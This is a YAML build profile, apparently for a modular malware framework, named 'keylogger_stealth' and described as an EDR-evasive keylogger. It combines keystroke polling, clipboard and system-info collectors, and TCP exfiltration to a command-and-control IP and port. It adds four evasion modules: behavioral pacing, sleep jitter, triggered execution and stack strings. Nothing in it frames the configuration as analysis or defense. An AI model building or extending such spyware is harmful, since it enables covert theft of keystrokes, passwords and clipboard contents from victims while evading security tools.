name: keylogger_stealth
description: EDR-evasive keylogger — zero child processes, 4 evasion layers, no persist

core:
  - core/emit_buffer

collectors:
  - collectors/system_info_api
  - collectors/clipboard

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

resources: true

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter
  - evasion/triggered_exec
  - evasion/stack_strings

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
